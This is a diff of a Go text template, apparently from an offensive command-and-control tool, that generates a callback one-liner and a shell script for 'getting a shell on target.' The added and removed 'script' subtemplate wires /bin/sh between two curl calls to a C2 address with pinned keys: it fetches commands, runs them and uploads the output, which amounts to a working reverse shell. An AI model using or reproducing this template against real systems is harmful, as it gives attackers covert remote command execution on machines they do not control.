@@ -3,13 +3,21 @@
      * Callback script (and more) template
      * By J. Stuart McMurray
      * Created 20240325
-     * Last Modified 20250115
+     * Last Modified 20250215
      */ -}}
 
 {{/* curl is a subsubtemplate which makes our curl calls consistent. */}}
 {{- define "curl" -}}
-curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} https://{{.Host}}
+curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} https://{{.C2Addr | nodefaultport}}
 {{- end -}}
+
+{{/* script hooks up a shell to two curls. */}}
+{{- define "script" -}}
+#!/bin/sh
+{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  </dev/null 2>&0 |
+/bin/sh 2>&1 |
+{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1
+{{  end -}}
 
 {{/* callback is a one-liner used for getting a shell on target.  It more or
    * less sends the "script" subtemplate, below, to a shell.  This is the
@@ -22,13 +30,5 @@ curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} https://{{.Host}}
 {{- define "files" -}}
 {{template "curl" .}}
 {{- end -}}
-
-{{/* script hooks up a shell to two curls. */}}
-{{- define "script" -}}
-#!/bin/sh
-{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  </dev/null 2>&0 |
-/bin/sh 2>&1 |
-{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1
-{{  end -}}
 
 {{/* vim: set filetype=gotexttmpl noexpandtab smartindent: */ -}}
